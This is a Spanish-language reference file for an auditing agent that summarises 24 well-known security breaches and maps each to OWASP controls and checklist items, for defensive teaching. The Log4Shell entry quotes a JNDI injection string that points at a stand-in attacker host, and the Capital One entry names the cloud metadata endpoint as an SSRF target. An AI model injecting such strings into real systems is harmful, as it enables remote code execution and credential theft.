# Historical Breach Database — Aprender de los errores ajenos

> 20 brechas públicas documentadas, usadas como material de enseñanza embebido en el SQA Agent.
> Cada entrada conecta una catástrofe real con el control de `checklists/security.md` que la habría evitado.
> Usado por `--breach-check` (¿este proyecto repite el patrón?) y por `--learn` (caso de estudio en cada hallazgo).
>
> Regla mental para el auditor: **"¿qué brecha famosa es esta vulnerabilidad esperando a pasar?"**

---

## 1. Equifax (2017) — 147M personas, ~$1.4B en costos
- **Patrón raíz:** componente sin parchar. Apache Struts2 vulnerable a **CVE-2017-5638** (RCE por OGNL injection en el header `Content-Type`). El parche existía hacía 2 meses.
- **Cómo escaló:** RCE → movimiento lateral → 76 días sin detectar (cert TLS de monitoreo expirado = tráfico de exfil no inspeccionado).
- **Controles que lo evitan:** A06 (componentes), A03 (injection), A09 (monitoreo). Dependabot/Trivy en CI, SLA de parcheo de críticos, renovación de certs monitoreada.
- **Lección Zentra:** un `npm audit` crítico ignorado "porque no hay tiempo" es exactamente esto.

## 2. Log4Shell / Log4j (2021) — internet entero, CVE-2021-44228 (CVSS 10.0)
- **Patrón raíz:** dependencia transitiva ubicua con RCE. Un string `${jndi:ldap://attacker/x}` en CUALQUIER campo logueado ejecutaba código remoto.
- **Cómo escaló:** trivial de explotar, presente en millones de apps Java vía dependencias indirectas que nadie sabía que tenía.
- **Controles que lo evitan:** A06, inventario/SBOM de dependencias transitivas, capacidad de responder rápido (saber qué usás y poder parchearlo en horas).
- **Lección Zentra:** no basta auditar dependencias directas — el CVE casi siempre vive 3 niveles abajo en el árbol.

## 3. SolarWinds / SUNBURST (2020) — 18.000 orgs, agencias federales de EEUU
- **Patrón raíz:** **compromiso del build pipeline**. Atacantes inyectaron un backdoor en el proceso de build de Orion; el binario salió **firmado y legítimo** a los clientes.
- **Cómo escaló:** update troyanizado distribuido por el canal oficial → backdoor en redes de gobierno y Fortune 500.
- **Controles que lo evitan:** A08 (integridad), CI/CD endurecido, acciones pinneadas por SHA, builds reproducibles, secrets del CI protegidos, principio de mínimo privilegio en el pipeline.
- **Lección Zentra:** la integridad del pipeline ES seguridad de producto. Un GitHub Action de tercero sin pin de SHA es esta puerta.

## 4. Capital One (2019) — 100M registros, multa $80M
- **Patrón raíz:** **SSRF** + IAM permisivo. Un WAF mal configurado permitió SSRF al **metadata service de EC2** (`169.254.169.254`), robando credenciales temporales con permisos amplios sobre S3.
- **Controles que lo evitan:** A10 (SSRF), bloqueo de rangos internos/metadata, IMDSv2, roles de mínimo privilegio.
- **Lección Zentra:** toda función que fetchea una URL provista por el usuario (avatar, import, preview) debe bloquear IPs internas y el endpoint de metadata.

## 5. Heartbleed (2014) — OpenSSL, CVE-2014-0160
- **Patrón raíz:** bug de memoria (buffer over-read) en la extensión heartbeat de TLS → leakeaba hasta 64KB de RAM del servidor por request (claves privadas, sesiones, passwords).
- **Controles que lo evitan:** A02/A06, mantener librerías crypto actualizadas, rotación de claves tras incidentes de la librería TLS.
- **Lección Zentra:** cuando tu librería de TLS/crypto tiene un CVE, rotás claves Y certificados, no solo actualizás el paquete.

## 6. Colonial Pipeline (2021) — paró el combustible de la costa este de EEUU, $4.4M rescate
- **Patrón raíz:** **VPN legacy sin MFA** accesible con una sola password (filtrada y reutilizada). Cuenta inactiva, sin MFA.
- **Controles que lo evitan:** A07, MFA obligatoria en todo acceso remoto/privilegiado, desactivar cuentas inactivas, no reutilizar passwords (check HIBP).
- **Lección Zentra:** un panel de admin o SSH sin MFA es una catástrofe de infraestructura crítica esperando.

## 7. Uber (2022) — compromiso interno total
- **Patrón raíz:** **MFA fatigue / push bombing**. Atacante con credenciales robadas spammeó push de MFA hasta que el empleado aprobó. Luego encontró **secrets hardcodeados en un script de PowerShell** con acceso admin a Thycotic (vault).
- **Controles que lo evitan:** A07 (MFA resistente a phishing/number-matching), A02 (cero secrets en código/scripts), gestión de secretos centralizada.
- **Lección Zentra:** dos lecciones — MFA por push es débil ante fatiga, y un secreto en un script es la llave del reino.

## 8. Optus (2022, Australia) — 9.8M registros
- **Patrón raíz:** **API sin autenticación** exponiendo datos de clientes, con **IDs secuenciales** fáciles de enumerar. No había nada que romper: solo iterar números.
- **Controles que lo evitan:** A01 (access control, IDOR), auth en TODO endpoint, IDs no enumerables (UUID).
- **Lección Zentra:** el caso de manual del IDOR. Cada endpoint con `/:id` debe verificar pertenencia y usar IDs no adivinables.

## 9. Marriott / Starwood (2018) — 383M huéspedes
- **Patrón raíz:** **brecha sin detectar ~4 años** (2014-2018) en el sistema de reservas heredado de Starwood, descubierto solo en la due diligence de la adquisición.
- **Controles que lo evitan:** A09 (logging/monitoreo/detección), revisión de seguridad de sistemas adquiridos/heredados.
- **Lección Zentra:** sin monitoreo, una brecha vive años. "No tuvimos incidentes" muchas veces significa "no los detectamos".

## 10. Adobe (2013) — 153M cuentas
- **Patrón raíz:** **cifrado de passwords mal hecho**: 3DES en modo **ECB** (no hashing) + password hints en claro. Passwords idénticos producían el mismo ciphertext → descifrables en masa por patrón.
- **Controles que lo evitan:** A02, hashing con bcrypt/argon2id (no cifrado reversible), sin hints.
- **Lección Zentra:** passwords se **hashean** (one-way con sal), nunca se cifran. Y ECB nunca, para nada.

## 11. LinkedIn (2012) — 117M / Yahoo (2013) — 3B cuentas
- **Patrón raíz:** LinkedIn usó **SHA-1 sin sal**; crackeable con rainbow tables. Yahoo usó MD5. Volumen masivo de passwords reveladas alimentó años de credential stuffing.
- **Controles que lo evitan:** A02 (KDF lento con sal), A07 (detección de credential stuffing, MFA).
- **Lección Zentra:** un hash rápido sin sal es texto plano con pasos extra. La reutilización de passwords convierte una brecha ajena en tu problema.

## 12. Target (2013) — 40M tarjetas, 70M registros
- **Patrón raíz:** **proveedor (HVAC) comprometido** con acceso a la red → movimiento lateral a TPV. Además, **las alertas de FireEye fueron ignoradas**.
- **Controles que lo evitan:** A09 (actuar sobre alertas), segmentación de red, mínimo privilegio para terceros, supply chain.
- **Lección Zentra:** el acceso de un proveedor/integración es tu superficie de ataque; segmentá y monitoreá. Y una alerta que nadie mira no sirve.

## 13. Codecov (2021) — robo masivo de secrets de CI
- **Patrón raíz:** **script de CI alterado** (Bash Uploader) exfiltró variables de entorno (tokens, claves) de miles de pipelines de clientes durante meses.
- **Controles que lo evitan:** A08, integridad de scripts de terceros en CI (verificar checksums), secrets de CI con mínimo alcance y rotables.
- **Lección Zentra:** cualquier script que corre en tu CI ve tus secrets. Pinealos, verificá su integridad, dales el mínimo alcance.

## 14. event-stream (2018) — supply chain npm
- **Patrón raíz:** un mantenedor entregó un paquete npm popular a un "voluntario" que agregó una **dependencia maliciosa** (`flatmap-stream`) para robar wallets de criptomonedas. Millones de descargas.
- **Controles que lo evitan:** A06/A08, lockfile, revisar diffs de updates, alertas de mantenedores nuevos, evitar dependencias de un solo mantenizador para cosas críticas.
- **Lección Zentra:** `npm install paquete-cualquiera` ejecuta código de extraños en tu máquina y tu CI. Auditá lo que agregás.

## 15. Tesla (2018) — cryptojacking en su cloud
- **Patrón raíz:** **consola de Kubernetes expuesta sin password**. Atacantes la encontraron, accedieron a credenciales de AWS y minaron cripto en la infra de Tesla.
- **Controles que lo evitan:** A05 (misconfiguration), nunca exponer consolas de admin sin auth — **directamente análogo a n8n/Adminer/Chatwoot expuestos**.
- **Lección Zentra:** la UI de n8n abierta a internet ES esta brecha. n8n ejecuta código arbitrario; sin auth es RCE servido en bandeja.

## 16. Heartland Payment Systems (2008) — 130M tarjetas
- **Patrón raíz:** **SQL injection** en una app web → punto de apoyo → sniffer en la red de procesamiento de pagos.
- **Controles que lo evitan:** A03 (queries parametrizadas), segmentación, A09 (detección de tráfico anómalo).
- **Lección Zentra:** la SQLi de un formulario "menor" fue la puerta a la red de pagos. No hay endpoint "sin importancia".

## 17. TalkTalk (2015, UK) — 157K clientes, multa récord ICO
- **Patrón raíz:** **SQL injection** en una página web heredada que la empresa ni recordaba mantener. Atacante adolescente.
- **Controles que lo evitan:** A03, inventario de assets (no podés proteger lo que olvidaste que tenés), retiro de sistemas legacy.
- **Lección Zentra:** las páginas viejas "que nadie usa" siguen siendo superficie de ataque. Inventariá y dá de baja lo muerto.

## 18. 3CX (2023) — supply chain en cascada
- **Patrón raíz:** el instalador firmado de 3CX fue troyanizado porque **3CX mismo fue comprometido vía OTRO software troyanizado** (X_TRADER). Cadena de suministro de doble salto.
- **Controles que lo evitan:** A08, verificación de integridad de TODO binario de terceros, behavioral monitoring de apps firmadas.
- **Lección Zentra:** "está firmado" no significa "es seguro" (ver SolarWinds, 3CX). La confianza en proveedores se verifica, no se asume.

## 19. MOVEit / Cl0p (2023) — miles de orgs, CVE-2023-34362
- **Patrón raíz:** **zero-day (SQLi → RCE)** en un software de transferencia de archivos muy usado, explotado en masa por ransomware antes de que existiera parche.
- **Controles que lo evitan:** A03/A06, minimizar superficie (no exponer servicios de transferencia sin necesidad), respuesta rápida a CVE, defensa en profundidad para cuando el parche no existe aún.
- **Lección Zentra:** ante un zero-day no hay parche; lo que te salva es segmentación, mínimo privilegio y detección. La defensa en capas es para este día.

## 20. Cloudflare / Okta (2022-2023) — robo de tokens y phishing de soporte
- **Patrón raíz:** combinación de **phishing de credenciales** + **robo de tokens de sesión** (cookies) que **saltó el MFA** (el token ya estaba autenticado). En Okta, comprometieron el sistema de soporte para pivotar a clientes.
- **Controles que lo evitan:** A07 (tokens de sesión cortos, binding al dispositivo/IP, MFA resistente a phishing como passkeys), A09 (detección de sesiones anómalas).
- **Lección Zentra:** robar la cookie de sesión saltea el MFA. Tokens cortos, `HttpOnly; Secure; SameSite`, y re-verificación en acciones sensibles.

---

## 21. xz-utils / liblzma (2024) — supply chain casi catastrófica, CVE-2024-3094
- **Patrón raíz:** mantenedor malicioso infiltrado 2 años ("Jia Tan") ganó confianza y plantó backdoor en la lib de compresión usada por sshd en distros mayores. Detectado por un ingeniero de Microsoft por una latencia de 500ms ANTES de llegar masivamente a producción.
- **Lección:** la confianza en mantenedores ES parte de tu superficie de ataque. Dependencias críticas del sistema requieren el mismo escrutinio que el código propio.
- **Control:** OWASP A03:2025 · checklist security §A03, Parte C

## 22. Change Healthcare (2024) — sector salud EEUU paralizado, ~$2.4B en costos
- **Patrón raíz:** credenciales comprometidas en portal de acceso remoto Citrix SIN MFA → ransomware ALPHV/BlackCat → claims médicos de medio EEUU detenidos semanas. Datos de ~190M personas.
- **Lección:** UN punto de acceso remoto sin MFA basta. El blast radius de infraestructura crítica multiplica el daño.
- **Control:** OWASP A07:2025 · checklist security §A07, infra

## 23. Snowflake customer breaches (2024) — Ticketmaster, Santander y ~165 orgs
- **Patrón raíz:** credenciales robadas por infostealers (años antes) + cuentas de cliente sin MFA ni network policies → exfiltración masiva multi-tenant. No fue brecha de Snowflake sino de configuración de sus clientes.
- **Lección:** la seguridad del SaaS es responsabilidad compartida — el proveedor da los controles, TÚ los activas. Credenciales viejas nunca expiran solas.
- **Control:** OWASP A07/A02:2025 · checklist security §A07, §A02

## 24. CrowdStrike (2024) — no-brecha que tumbó al mundo, ~8.5M Windows BSOD
- **Patrón raíz:** update de contenido con datos malformados pasó validación defectuosa → null pointer en driver kernel → BSOD global simultáneo (aviación, banca, hospitales). Sin canary deployment, sin rollback gradual.
- **Lección:** el manejo de condiciones excepcionales y el despliegue gradual son controles de seguridad. Fail-open/crash a escala = incidente de disponibilidad masivo sin atacante.
- **Control:** OWASP A10:2025 (Mishandling of Exceptional Conditions) · checklist security §A10, devops

## Tabla resumen — patrón → control → caso

| # | Brecha | Patrón raíz | Control OWASP | Checklist |
|---|--------|-------------|---------------|-----------|
| 1 | Equifax | Componente sin parchar (Struts RCE) | A06/A03 | security §A06, Parte C |
| 2 | Log4Shell | Dep. transitiva con RCE | A06 | security §A06, Parte C |
| 3 | SolarWinds | Build pipeline comprometido | A08 | devops, security §A08 |
| 4 | Capital One | SSRF → metadata cloud | A10 | security §A10 |
| 5 | Heartbleed | Bug memoria en TLS lib | A02/A06 | security §A02 |
| 6 | Colonial Pipeline | VPN sin MFA + pass reutilizada | A07 | security §A07, infra |
| 7 | Uber | MFA fatigue + secret en script | A07/A02 | security §A07, Parte C |
| 8 | Optus | API sin auth + IDs secuenciales | A01 | security §A01 |
| 9 | Marriott | Brecha sin detectar 4 años | A09 | security §A09 |
| 10 | Adobe | Passwords cifrados (3DES-ECB) | A02 | security §A02 |
| 11 | LinkedIn/Yahoo | Hash rápido sin sal | A02/A07 | security §A02 |
| 12 | Target | Proveedor comprometido + alerta ignorada | A09 | security §A09, infra |
| 13 | Codecov | Script CI alterado | A08 | devops, security Parte C |
| 14 | event-stream | Dependencia npm maliciosa | A06/A08 | security Parte C |
| 15 | Tesla | Consola admin sin password | A05 | security §A05, B8 (n8n) |
| 16 | Heartland | SQLi → red de pagos | A03 | security §A03 |
| 17 | TalkTalk | SQLi en legacy olvidado | A03 | security §A03 |
| 18 | 3CX | Supply chain en cascada | A08 | devops, security §A08 |
| 19 | MOVEit | Zero-day SQLi→RCE explotado en masa | A03/A06 | security §A03, infra |
| 20 | Cloudflare/Okta | Robo de token de sesión, bypass MFA | A07/A09 | security §A07 |

---

## Cómo usar este archivo en una auditoría

1. **Modo `--breach-check`:** para cada brecha, responder ¿el patrón raíz existe en este proyecto? (sí / no / no aplica). Reportar solo los presentes o no verificables.
2. **Modo `--security`:** al encontrar un hallazgo crítico, citar la brecha equivalente como precedente para dimensionar el riesgo ante el cliente ("esto es el mismo error que costó $1.4B a Equifax").
3. **Modo `--learn`:** usar el caso real como sección "Caso real" en la explicación educativa de cada hallazgo de seguridad.
4. **En `--plan`:** revisar esta lista durante el threat model — la mayoría de las catástrofes son 5-6 patrones repetidos, no exploits exóticos.
| 21 | xz-utils | Mantenedor malicioso / backdoor en dep | A03:2025 | security §A03, Parte C |
| 22 | Change Healthcare | Acceso remoto sin MFA → ransomware | A07:2025 | security §A07, infra |
| 23 | Snowflake (clientes) | Infostealer creds + sin MFA en SaaS | A07:2025 | security §A07 |
| 24 | CrowdStrike | Update sin canary + fallo excepcional kernel | A10:2025 | security §A10, devops |
